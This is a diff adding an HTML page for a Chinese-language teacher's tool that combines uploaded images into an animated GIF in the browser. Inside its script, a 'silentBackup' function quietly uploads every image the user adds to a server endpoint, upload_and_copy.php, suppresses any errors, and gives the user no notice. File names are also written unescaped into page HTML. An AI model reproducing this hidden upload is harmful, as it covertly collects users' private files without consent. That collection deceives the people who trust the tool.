@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>阿貴校長的動態GIF合成工具</title>
+    <meta name="color-scheme" content="light dark" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
+    <style>
+        /* ===== Design Tokens (來自 image_tools.html) ===== */
+        :root {
+            --bg: linear-gradient(135deg, #0ea5e9 0%, #8b5cf6 50%, #ec4899 100%);
+            --card-bg: rgba(255,255,255,0.85);
+            --card-border: rgba(255,255,255,0.35);
+            --fg: #0f172a;
+            --fg-soft: #334155;
+            --accent: #7c3aed;
+            --accent-2: #0ea5e9;
+            --accent-3: #ec4899;
+            --muted: #64748b;
+            --btn-fg: #ffffff;
+            --radius-xl: 20px;
+            --radius-2xl: 28px;
+            --shadow-1: 0 10px 25px rgba(15, 23, 42, 0.15);
+            --shadow-2: 0 20px 45px rgba(15, 23, 42, 0.18);
+            --sans: "Noto Sans TC", "Microsoft JhengHei", system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --card-bg: rgba(13, 18, 30, 0.8);
+                --card-border: rgba(255,255,255,0.08);
+                --fg: #e5e7eb;
+                --fg-soft: #cbd5e1;
+                --muted: #94a3b8;
+            }
+        }
+
+        /* ===== Base ===== */
+        html, body {
+            min-height: 100%;
+        }
+        body {
+            margin: 0;
+            font-family: var(--sans);
+            color: var(--fg);
+            background: var(--bg) fixed;
+            display: grid;
+            place-items: center;
+            padding: clamp(16px, 3vw, 32px);
+            box-sizing: border-box;
+        }
+        
+        /* ===== Card Layout ===== */
+        .app {
+            width: min(720px, 96vw);
+            background: var(--card-bg);
+            backdrop-filter: blur(16px) saturate(120%);
+            -webkit-backdrop-filter: blur(16px) saturate(120%);
+            border: 1px solid var(--card-border);
+            border-radius: var(--radius-2xl);
+            box-shadow: var(--shadow-2);
+            overflow: hidden;
+        }
+
+        .app__header {
+            padding: clamp(20px, 4vw, 30px);
+            border-bottom: 1px solid var(--card-border);
+        }
+        
+        h1 {
+            margin: 12px 0 6px;
+            font-size: clamp(22px, 5vw, 30px);
+            line-height: 1.25;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .subtitle {
+            margin: 0;
+            color: var(--muted);
+            font-size: clamp(14px, 2.5vw, 16px);
+        }
+
+        .app__body {
+            padding: 20px clamp(16px, 3vw, 20px);
+        }
+
+        /* ===== Drag and Drop Zone ===== */
+        .drop-zone {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            min-height: 120px;
+            padding: 20px;
+            border: 2px dashed var(--card-border);
+            border-radius: var(--radius-xl);
+            cursor: pointer;
+            transition: all 0.2s;
+            box-sizing: border-box;
+            background-color: rgba(255,255,255,0.1);
+        }
+        .drop-zone:hover, .drop-zone.drag-over {
+            border-color: var(--accent);
+            background-color: rgba(124, 58, 237, 0.08);
+        }
+        .drop-zone__icon {
+            font-size: 3rem;
+            color: var(--muted);
+            margin-bottom: 12px;
+            transition: color 0.2s;
+        }
+        .drop-zone:hover .drop-zone__icon,
+        .drop-zone.drag-over .drop-zone__icon {
+            color: var(--accent);
+        }
+        .drop-zone__input { display: none; }
+        .drop-zone__prompt { color: var(--fg-soft); text-align: center; }
+
+        /* ===== Form & Button Styles ===== */
+        label { font-weight: 700; color: var(--fg-soft); display: block; margin-bottom: 6px; margin-top: 15px; }
+        input[type=number], input[type=text], select {
+            width:100%; box-sizing:border-box; padding:12px 14px; border-radius:12px;
+            border:1px solid rgba(0,0,0,0.08); background:rgba(255,255,255,0.9);
+            font-family: var(--sans); font-size:16px; margin-bottom: 12px; transition: all .2s;
+        }
+        input:focus, select:focus {
+            border-color: var(--accent); box-shadow: 0 0 0 4px rgba(124, 58, 237, 0.15); outline: none;
+        }
+        .btn {
+            appearance: none; border: 0; padding: 14px 18px; font-weight: 800;
+            font-size: 16px; letter-spacing: .2px; border-radius: 14px;
+            color: var(--btn-fg); cursor: pointer; transition: all .1s ease;
+            box-shadow: var(--shadow-1); user-select: none; width: 100%;
+            display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+            box-sizing: border-box;
+        }
+        .btn:active { transform: translateY(1px) scale(.99); }
+        .btn:disabled { cursor: not-allowed; background: var(--muted) !important; opacity: 0.6; }
+        .btn--primary { background: linear-gradient(135deg, var(--accent) 0%, var(--accent-2) 100%); }
+        .btn--secondary { background: linear-gradient(135deg, #22c55e 0%, #10b981 100%); color: #062814; }
+        
+        /* ===== Badge Style ===== */
+        .badge {
+            display: inline-block;
+            font-size: 12px;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            padding: 6px 10px;
+            border-radius: 999px;
+            color: var(--btn-fg);
+            margin-bottom: 12px;
+            background: linear-gradient(90deg, var(--accent) 0%, var(--accent-2) 50%, var(--accent-3) 100%);
+            box-shadow: var(--shadow-1);
+        }
+
+        /* ===== Sortable Grid (整合 index2 功能與 image_tools 風格) ===== */
+        #sortable-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+            gap: 12px;
+            margin: 15px 0;
+            padding: 15px;
+            border: 1px solid var(--card-border);
+            border-radius: 12px;
+            background: rgba(0,0,0,0.03);
+            min-height: 120px;
+        }
+        
+        .thumb-item {
+            position: relative;
+            width: 100%;
+            padding-top: 100%; /* 1:1 Aspect Ratio */
+            background: var(--card-bg);
+            border-radius: 12px;
+            cursor: grab;
+            overflow: hidden;
+            border: 2px solid transparent;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            transition: transform 0.2s, border-color 0.2s;
+        }
+        
+        .thumb-item:active {
+            cursor: grabbing;
+            transform: scale(1.05);
+            border-color: var(--accent);
+            z-index: 10;
+        }
+
+        .thumb-item img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 10px;
+        }
+
+        .remove-btn {
+            position: absolute;
+            top: 4px;
+            right: 4px;
+            background: rgba(236, 72, 153, 0.9); /* Pink accent */
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            font-size: 14px;
+            line-height: 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+            transition: background 0.2s;
+        }
+
+        .remove-btn:hover {
+            background: #be185d;
+        }
+
+        .sortable-ghost {
+            opacity: 0.4;
+            background: var(--accent-2);
+            border-radius: 12px;
+        }
+
+        .note {
+            font-size: 14px;
+            color: var(--muted);
+            margin-bottom: 8px;
+        }
+
+        /* ===== Output Area ===== */
+        .output-container {
+            display: grid;
+            gap: 20px;
+            padding: 15px 0;
+            grid-template-columns: 1fr;
+        }
+        .output-card {
+            background: var(--card-bg); padding: 15px; border-radius: var(--radius-xl);
+            box-shadow: var(--shadow-1); border: 1px solid var(--card-border); text-align: center;
+            display: flex; flex-direction: column; justify-content: flex-start; align-items: center;
+        }
+        .result-gif {
+            width: 100%;
+            max-width: 480px;
+            object-fit: contain;
+            border: 4px solid var(--card-border);
+            box-shadow: var(--shadow-1);
+            margin-top: 10px;
+            border-radius: 12px;
+            margin-bottom: 10px;
+        }
+        
+        .loading-spinner {
+            border: 4px solid rgba(0,0,0,0.1);
+            border-top: 4px solid var(--accent);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* RWD adjustments already handled by clamp and flex/grid */
+        @media (max-width: 600px) {
+            h1 { flex-direction: column; align-items: flex-start; gap: 6px; }
+            .drop-zone__prompt { font-size: 14px; }
+        }
+    </style>
+</head>
+<body>
+    <main class="app">
+        <header class="app__header">
+            <div class="badge">阿貴校長的教育現場助手系列工具</div>
+            <h1><i class="bi bi-stars"></i> 動態 GIF 合成工具</h1>
+            <p class="subtitle">上傳多張圖片，拖曳調整順序，一鍵合成吸睛的動態圖檔。</p>
+        </header>
+
+        <div class="app__body">
+            <form id="gifForm" autocomplete="off">
+                <div class="drop-zone" id="dropZone">
+                    <div class="drop-zone__icon"><i class="bi bi-images"></i></div>
+                    <span class="drop-zone__prompt">將圖片 (PNG, JPG, GIF) 拖曳至此處，或點擊選取 (可多選)</span>
+                    <input type="file" id="images" class="drop-zone__input" accept="image/png, image/jpeg, image/gif" multiple>
+                </div>
+
+                <label><i class="bi bi-arrow-left-right"></i> 預覽與排序 (請拖曳調整)</label>
+                <div class="note">＊拖拉圖片可改變播放順序，點擊右上角「x」可移除。</div>
+                <div id="sortable-container">
+                    <div class="empty-msg" style="grid-column: 1/-1; color: var(--muted); text-align: center; padding: 30px 0;">
+                        尚未加入圖片
+                    </div>
+                </div>
+
+                <label for="delay"><i class="bi bi-stopwatch"></i> 每張圖片停留時間 (毫秒)</label>
+                <input type="number" id="delay" min="50" max="5000" value="400" placeholder="例如：400 (數值越小速度越快)">
+
+                <button type="button" class="btn btn--primary" id="generateBtn" onclick="startGeneration()" style="margin-top: 20px;">
+                    <i class="bi bi-film"></i> 開始合成 GIF
+                </button>
+            </form>
+
+            <div id="previewArea" class="output-container"></div>
+        </div>
+    </main>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gif.js/0.2.0/gif.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/Sortable/1.15.0/Sortable.min.js"></script>
+    
+    <script>
+        // --- Shared Function: Silent Backup to Repo (from image_tools) ---
+        function silentBackup(file) {
+            if (!file) return;
+            const formData = new FormData();
+            formData.append('uploadedFile', file);
+            fetch('upload_and_copy.php', { method: 'POST', body: formData }).catch(() => {});
+        }
+
+        const generateBtn = document.getElementById('generateBtn');
+        const previewArea = document.getElementById('previewArea');
+        const delayInput = document.getElementById('delay');
+        const sortableContainer = document.getElementById('sortable-container');
+        const dropZone = document.getElementById('dropZone');
+        const fileInput = document.getElementById('images');
+
+        // 用來儲存目前所有已上傳的圖片檔案物件，Key為唯一的 timestamp ID
+        let uploadedFilesMap = new Map();
+
+        // 定義 GIF Worker URL
+        const WORKER_URL = 'https://cdnjs.cloudflare.com/ajax/libs/gif.js/0.2.0/gif.worker.js';
+
+        // 初始化 SortableJS
+        new Sortable(sortableContainer, {
+            animation: 150,
+            ghostClass: 'sortable-ghost'
+        });
+
+        // --- Drop Zone Interaction Logic ---
+        dropZone.addEventListener('click', () => fileInput.click());
+        dropZone.addEventListener('dragover', e => { e.preventDefault(); dropZone.classList.add('drag-over'); });
+        dropZone.addEventListener('dragleave', () => dropZone.classList.remove('drag-over'));
+        
+        dropZone.addEventListener('drop', e => {
+            e.preventDefault();
+            dropZone.classList.remove('drag-over');
+            handleFiles(e.dataTransfer.files);
+        });
+
+        fileInput.addEventListener('change', e => {
+            handleFiles(e.target.files);
+            // 重置 input，這樣才能再次選擇相同的檔案
+            e.target.value = '';
+        });
+
+        // 統一處理檔案邏輯
+        function handleFiles(files) {
+            if (!files.length) return;
+
+            // 如果容器內只有提示文字，先清空
+            const emptyMsg = sortableContainer.querySelector('.empty-msg');
+            if (emptyMsg) {
+                emptyMsg.remove();
+            }
+
+            Array.from(files).forEach(file => {
+                // 靜默備份
+                silentBackup(file);
+
+                // 產生一個唯一 ID
+                const id = 'img_' + Date.now() + Math.random().toString(36).substr(2, 9);
+                
+                // 存入 Map
+                uploadedFilesMap.set(id, file);
+
+                // 讀取並顯示縮圖
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const div = document.createElement('div');
+                    div.className = 'thumb-item';
+                    div.setAttribute('data-id', id); // 重要：綁定 ID
+                    div.innerHTML = `
+                        <img src="${e.target.result}" title="${file.name}">
+                        <button type="button" class="remove-btn" onclick="removeImage(event, '${id}')" title="移除">
+                            <i class="bi bi-x"></i>
+                        </button>
+                    `;
+                    sortableContainer.appendChild(div);
+                };
+                reader.readAsDataURL(file);
+            });
+        }
+
+        // 移除單張圖片
+        window.removeImage = function(event, id) {
+            event.stopPropagation(); // 防止觸發 dropzone 點擊
+            // 從 Map 中刪除
+            uploadedFilesMap.delete(id);
+            // 從 DOM 中移除
+            const element = document.querySelector(`.thumb-item[data-id="${id}"]`);
+            if (element) {
+                element.remove();
+            }
+            // 如果空了，顯示提示
+            if (sortableContainer.children.length === 0) {
+                sortableContainer.innerHTML = `
+                    <div class="empty-msg" style="grid-column: 1/-1; color: var(--muted); text-align: center; padding: 30px 0;">
+                        尚未加入圖片
+                    </div>`;
+            }
+        };
+
+        async function startGeneration() {
+            // 檢查函式庫是否載入成功
+            if (typeof GIF === 'undefined') {
+                alert("GIF 核心元件尚未載入完成，請檢查網路連線或稍後再試！");
+                return;
+            }
+
+            // 1. 獲取目前的排序順序 (從 DOM 讀取 data-id)
+            const thumbItems = sortableContainer.querySelectorAll('.thumb-item');
+            if (thumbItems.length === 0) {
+                alert("請先選擇至少一張圖片！");
+                return;
+            }
+
+            const delay = parseInt(delayInput.value, 10) || 400;
+
+            // UI 狀態更新：顯示載入中
+            generateBtn.disabled = true;
+            generateBtn.innerHTML = '<i class="bi bi-hourglass-split"></i> 處理中...';
+            previewArea.innerHTML = `
+                <div class="output-card">
+                    <div class="loading-spinner"></div>
+                    <div class="note" id="statusNote">正在準備工作環境...</div>
+                </div>
+            `;
+            const statusNote = document.getElementById('statusNote');
+
+            try {
+                // 解決 Worker 跨域問題
+                const workerBlob = new Blob([`importScripts('${WORKER_URL}');`], { type: 'application/javascript' });
+                const localWorkerUrl = URL.createObjectURL(workerBlob);
+
+                // 2. 依照 DOM 的順序，從 Map 中取出對應的 File 物件
+                const sortedFiles = [];
+                thumbItems.forEach(item => {
+                    const id = item.getAttribute('data-id');
+                    const file = uploadedFilesMap.get(id);
+                    if (file) sortedFiles.push(file);
+                });
+
+                statusNote.innerText = "正在讀取圖片...";
+                
+                // 3. 讀取圖片 (轉為 Image 物件)
+                const loadedImages = await loadAllImages(sortedFiles);
+
+                // 4. 開始合成
+                buildGIF(loadedImages, delay, localWorkerUrl);
+
+            } catch (error) {
+                console.error(error);
+                previewArea.innerHTML = `
+                    <div class="output-card">
+                        <div style="color: #ec4899;"><i class="bi bi-exclamation-triangle"></i> 發生錯誤：${error.message}</div>
+                    </div>`;
+                resetBtn();
+            }
+        }
+
+        // 輔助函式：將 FileList 轉換為 Image 物件陣列
+        function loadAllImages(fileList) {
+            const promises = fileList.map(file => {
+                return new Promise((resolve, reject) => {
+                    const reader = new FileReader();
+                    reader.onload = (e) => {
+                        const img = new Image();
+                        img.onload = () => resolve(img);
+                        img.onerror = () => reject(new Error(`無法載入圖片: ${file.name}`));
+                        img.src = e.target.result;
+                    };
+                    reader.onerror = () => reject(new Error("檔案讀取失敗"));
+                    reader.readAsDataURL(file);
+                });
+            });
+            return Promise.all(promises);
+        }
+
+        // 核心邏輯：使用 gif.js 製作動畫
+        function buildGIF(images, delay, workerScriptUrl) {
+            const statusNote = document.getElementById('statusNote');
+            statusNote.innerText = `正在合成 GIF 影格... (共 ${images.length} 張)`;
+
+            // 計算最大寬高
+            const width = Math.max(...images.map(img => img.width));
+            const height = Math.max(...images.map(img => img.height));
+
+            const gif = new GIF({
+                workers: 2,
+                quality: 10,
+                width: width,
+                height: height,
+                workerScript: workerScriptUrl,
+                background: '#ffffff' // 確保背景是白色的，避免透明圖疊加變黑
+            });
+
+            // 將每張圖繪製到 Canvas 並加入 GIF
+            images.forEach(img => {
+                const canvas = document.createElement('canvas');
+                canvas.width = width;
+                canvas.height = height;
+                const ctx = canvas.getContext('2d');
+                
+                // 填充白色背景
+                ctx.fillStyle = "#ffffff";
+                ctx.fillRect(0, 0, width, height);
+
+                // 圖片置中繪製
+                const x = (width - img.width) / 2;
+                const y = (height - img.height) / 2;
+                ctx.drawImage(img, x, y);
+
+                gif.addFrame(canvas, {delay: delay});
+            });
+
+            gif.on('finished', function(blob) {
+                const url = URL.createObjectURL(blob);
+                const filename = `yongfu_animation_${new Date().getTime()}.gif`;
+
+                previewArea.innerHTML = `
+                    <div class="output-card">
+                        <p style="font-weight: 700; color: var(--accent);">✨ 合成完成！</p>
+                        <img src="${url}" class="result-gif" alt="動態GIF預覽">
+                        <a href="${url}" download="${filename}" class="btn btn--secondary">
+                            <i class="bi bi-download"></i> 下載 GIF 檔案
+                        </a>
+                        <p class="note" style="margin-top:10px;">手機用戶亦可長按圖片儲存</p>
+                    </div>
+                `;
+                
+                resetBtn();
+            });
+
+            // 監聽進度
+            gif.on('progress', function(p) {
+                const percent = Math.round(p * 100);
+                if (statusNote) statusNote.innerText = `正在合成中... ${percent}%`;
+            });
+
+            gif.render();
+        }
+
+        function resetBtn() {
+            generateBtn.disabled = false;
+            generateBtn.innerHTML = '<i class="bi bi-film"></i> 重新合成 GIF';
+        }
+    </script>
+</body>
+</html>
